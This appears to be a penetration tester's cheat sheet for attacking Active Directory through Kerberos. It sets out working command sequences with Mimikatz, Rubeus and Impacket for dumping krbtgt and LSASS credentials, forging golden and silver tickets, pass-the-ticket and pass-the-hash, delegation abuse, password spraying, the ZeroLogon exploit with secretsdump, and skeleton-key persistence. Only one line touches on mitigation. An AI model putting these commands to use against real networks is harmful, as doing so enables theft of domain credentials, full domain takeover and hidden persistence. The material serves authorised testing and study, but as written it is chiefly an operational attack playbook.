## Golden and silver tickets
```
A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.

-Note : klist shows the available tickets in the context of current user. Our Main goal is krbtgt so if our user doesnt show krbtgt ticket,try switching to other users sessions because the ticket contexts keeps switching dynamically.

the ticket which we impersonate can be that of a domain admin or the kerberos service itself.


Using Mimikatz
This attack requires atleast loacal administrator priveleges

    Run mimikatz to get in its shell
    mimikatz.exe

    check our priveleges that if we can perfrom this attack or not
    privilege::debug

    Now we will dump all tickets having accss to krbtgt
    lsadump::lsa /inject /name:krbtgt ( To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.)

    creating our ticket

    Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id: (to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and id of account in /id:)

This all is found in previous steps: specify sid value in /sid: specify ntlm hash in /krbtgt: specify id number in /id:

We can also specify /ptt at the end of above command and the ticket will be injected rightaway in our session. This can be stealthy as Blueteams can detect the kirbi ticket being made

    NOw type following command to open prompt with privileges of the created golden or silver tickets
    misc::cmd



Using Rubeus (Rubeus will dump all the tickets,we will ourselves select high privilege tickets like krbtgt or admin ticket and create a golden or silver ticket)

    First we need to be a user of administrator group for this attack

    We run following command to dump all the tickets from lsaas
    rubues.exe dump

    Now we need to look for Admin users or any users which have krbtgt service access meaning they are kerberos service accounts and if we are succesful the whole domain can be compromised

    We can now add the contennts of the ticket to be compromised in a file using powershell

    [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("BASE64TICKETCONTENTS"))

Injection
    Now a file named ticket.kirbi is made and we can now inject this ticket into memory to impersonate the ticket owner

    .\Rubeus.exe ptt /ticket:ticket.kirbi

    NOw we have priveleges of the user same as whose ticket we just exploited

    Remote sessions with injected golden tickets (Optional)

Using above techniques we can get a ticket and then we can transfer to our machine and convert it into linux compatible format (ccache)

    THen we export the ticket in an env variable used by imapacket

    export KRB5CCNAME=ticket.ccache

    Now connect to the machine using ps exec

    python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass

the -k and -no-pass flags triggers the impacket to use our ticket in our environment variable above.

Good Resource : https://attack.stealthbits.com/how-golden-ticket-attack-works

https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass

Offline Ticket Creation (We can create tickets offline to make less noise after getting the required info from above tools)
If we have a users sid , and hash we can create ticket on linux and then convert the .ccache ticket to kirbi and use on target

    python ticketer.py -nthash f3bc61e97fb14d18c42bcbf6c3a9055f -domain-sid S-1-5-21-3523557010-2506964455-2614950430 -domain domain.name username

We can convert ticket format to .ccache if we want to use with tools like psexec smbexec ,crackmapexec directly in session. .kirbi format only works in windows so if we use this,it will make some noise

    Ticket formats converting(linux and windows)

we can use ticket_converter.py to convert the types ccache is compatible with linux and kirbi with windows

python ticket_converter.py ticket.kirbi ticket.ccache python ticket_converter.py ticket.ccache ticket.kirbi

To inject the ticket directly in our sessions from linux

    export KRB5CCNAME=ticket.ccache

KRB5CCNAME is a env variable used to store ticket path

now we can use any tool like smbexec,crackmapexec etc and pass the -k flag which will automatically include ticket from env var .

    python psexec.py domain.name/user@TARGETIP-k -no-pass

Constrained/UnConstrained Delegation
http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html?m=1

An account with constrained delegation enabled is allowed to request tickets to itself as any user, in a process known as S4U2self. In order for an account to be allowed to do this, it has to have TrustedToAuthForDelegation enabled in it's useraccountcontrol property, something that only elevated users can modify by default. This ticket has the FORWARDABLE flag set by default. The service can then use this specially requested ticket to request a service ticket to any service principal name (SPN) specified in the account's msds-allowedtodelegateto field. So long story short, if you have control of an account with TrustedToAuthForDelegation set and a value in msds-allowedtodelegateto, you can pretend to be any user in the domain to the SPNs set in the account's msds-allowedtodelegateto field.

we must use the user and credentials who have access to those service accouns or management accounts which have some kind of delgation(impersonation) capability

    Enumerating delegated users

    First import Powerview then Get-NetComputer -UnConstrained

Using Rubeus
https://github.com/GhostPack/Rubeus#s4u

    Rubeus.exe s4u /user:username /rc4:hash /impersonateuser:delegated user

This "control" can be the hash of the account (/rc4 or /aes256), or an existing TGT (/ticket:X) for the account with a msds-allowedtodelegateto value set. If a /user and rc4/aes256 hash is supplied, the s4u module performs an asktgt action first, using the returned ticket for the steps following. If a TGT /ticket:X is supplied, that TGT is used instead.

A /impersonateuser:X parameter MUST be supplied to the s4u module. If nothing else is supplied, just the S4U2self process is executed, returning a forwardable ticket:
Dump silver tickets remotely using impacket

we can dump silver tickets for service accounts using GetST.py from impacket(requires credentials of user having access to that service or delegation privilege)

Impacket’s getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation privileges, you can use the -impersonate flag to request a ticket on behalf of another user. The following command will impersonate the Administrator account and request a Service Ticket on its behalf for the www service on host server01.test.local.

    python3 getST.py -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john:password123

Note: here the www service is specified but we can use the created ticket for all srvice types across domains like smb,winrm,ldap etc if the delegated user has access to those
Pass the ticket (This is just like golden ticket attack,but we can create ticket of any user we want in this,not only domain admin)
Pass the ticket attack

Pass the Ticket Overview - Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.

    using Rubeus
    First we need to be a user of administrator group for this attack

    We run following command to dump all the tickets from lsass
    rubues.exe dump

    Now we need to look for Admin users or any users which have krbtgt service access meaning they are kerberos service accounts and if we are succesful the whole domain can be compromised

    We can now will now add the contennts of the ticket to be compromised in a file using powershell

    [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("BASE64TICKETCONTENTS"))

    Now a file named ticket.kirbi is made and we can now inject this ticket into memory to impersonate as the ticket owner

    .\Rubeus.exe ptt /ticket:ticket.kirbi

    NOw we have priveleges of the user same as whse ticket we just exploited

Mimikatz
    using mimikatz
This attack requires atleast loacl administrator priveleges

    Run mimikatz to get in its shell

    mimikatz.exe

    check our priveleges that if we can perfrom this attack or not

    privilege::debug

    Now we export the tickets in our working directory

    sekurlsa::tickets /export (we can also specify different things to export instaead of tickets . The sekrulsa support many different things to be dumped)

    we must choose those .kirbi tickets which have full domain access (krbtgt) and also admin access.They should have this keyword in it

    Now we will use this ticket and impersonate as domain admin

    kerberos::ptt ticketname

    The following command will verify if we succesfuly cached the domain admin tikcet in our cache table

    klist

    using Impacket

    First we add our ticket file to default env variable if Impacket

    export KRB5CCNAME=ticket.ccache

    Now connect to the machine using ps exec

    python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass

or smbexec or wmiexec or crackmapexec

    Pass the Ticket Mitigation

How to mitigate these types of attacks.

Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with


Harvesting(gathering) tickets (Used in passtheticket attacks)

we can use a tool called rubeus.exe for this purpose

This command tries to gather the ticket being generated every 30 seconds

    Rubeus.exe harvest /interval:30 (we can also specify specific user to target by adding /username:password in this command,also domain or domaincontroller)

bruteforcing tickets
We can also use this tool to bruteforce users and then we can issue a TGT this way and connect to a secure service

For this we will need to add the domain in targets host file

    echo targetsIP domain.name >> C:\Windows\System32\drivers\etc\hosts

Now we will perform the password spraying

    Rubeus.exe brute /password:Password1 /noticket

here Password1 is the provided password

This will give us a .kirbi ticket
Requesting TGT using hash(pass the hash)

    using Rebeus

    We run the command to ask KDC to grant us a tgt just like a normal user would. THe only change is this that we are using users hash and impersanating as that user

    .\Rubeus.exe asktgt /domain:domain.name /user:username /rc4:USERHASH /ptt

This command outputs the ticket for that user and then using the powershell input streamer which we used in pass the tickets attack we can write to a file and then use rubeus to inject the ticket into memory

    Using Impacket (REmote attack)

We must have credentials and a way to login machine remotley
Request the TGT with hash

python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)

python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
Request the TGT with password

python getTGT.py <domain_name>/<user_name>:[password]

If not provided, password is asked
ZeroLogon exploit (CVE-2020-1472) Critical exploit - may damage the target system

This vulneribility targets domain controller and set its password to a null string. This is a critical exploit so client permission is neccassary .

    First we have to check if our target domain is vulnerbale to this or not. We will use a python script to confirm

use following script

    https://github.com/SecuraBV/CVE-2020-1472

    python3 zerologon_tester.py DC-NAME DC-IP

    If its vulnerable and we want to exploit it ,use follwoing poc script

    https://github.com/dirkjanm/CVE-2020-1472

    python3 cve-2020-1472-exploit.py DC-NAME DC-IP

    Now we can dump the hashes using secretsdump or crackmapexec

    python3 secretsdump.py -just-dc DOMAIN/DC-NAME\$@DC-IP

$ is for specifying that password is null

This will dump all the hashes from Domain controller and we can pass the hash,perform golden ticket attacks etc

    Now we have the hashes,we need to restore the DC password in order to avoid detection and causing unintended damage to the system

we will again use secretsdump but with a domain admin account and passing the hash to find a password hex key which will allow us to restore the system as before the exploitation

    python3 secretsdump.py domainadmin@DC-IP -hashes USERHASH

this will again dump hashes but will also dump hex keys from registry(after exploitation original dc password doesnt change to null in registry saves hence allowing us to restore) allowing us to restore dc password

    Lastly we will use the restore password script to restore the system as it was

    python3 restorepassword.py DOMAIN/DC-NAME@DC-NAME -target-ip DC-IP -hexpass HEXKEY

AD backdoor and Persistance

Golden Tickets are also form of persistance

If we have a users sid , and hash we can create ticket on linux and then convert the .ccache ticket to kirbi and use on target

    python ticketer.py -nthash f3bc61e97fb14d18c42bcbf6c3a9055f -domain-sid S-1-5-21-3523557010-2506964455-2614950430 -domain domain.name username

We can convert ticket format to .ccache if we want to use with tools like psexec smbexec ,crackmapexec directly in session. .kirbi format only works in windows so if we use this,it will make some noise

    Ticket formats converting(linux and windows)

we can use ticket_converter.py to convert the types ccache is compatible with linux and kirbi with windows

python ticket_converter.py ticket.kirbi ticket.ccache python ticket_converter.py ticket.ccache ticket.kirbi

To inject the ticket directly in our sessions from linux

    export KRB5CCNAME=ticket.ccache

KRB5CCNAME is a env variable used to store ticket path

now we can use any tool like smbexec,crackmapexec etc and pass the -k flag which will automatically include ticket from env var .

    python psexec.py domain.name/user@TARGETIP-k -no-pass

Skeleton Key Overview -

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption.

This attack requires atleast loacal administrator priveleges

    Run mimikatz to get in its shell

    mimikatz.exe

    check our priveleges that if we can perfrom this attack or not

    privilege::debug

    Now we implant the skeleton key in the AD Forest

    misc::skeleton This allows us to access any share of any machine on any domain in the forest without ever enumurating it from the start beccause we already have a golden ticket and we make our access more easy

Accessing the Forest

The default credentials will be: "mimikatz"

We can now make admin shares for our current user with elevated privileges persistent.we can configure any shares to accept us without authentication by follwoing command example

example: net use c:\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password

example: dir \Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1
Active Directory Post Exploitation

After we are a domain admin, now our goal is to gather as much information as possible

    One way we can do is by rdp into the machine and then using windows server manager as it allows the management of whole domain in a AD environment

    The most useful feature of windows server in post exploitation is going in tools tab and then enumerating different things going around on network

    One important is the users and computers information tool whihc shows active users and sometimes people leave their passswords in the description so they dont forget
```
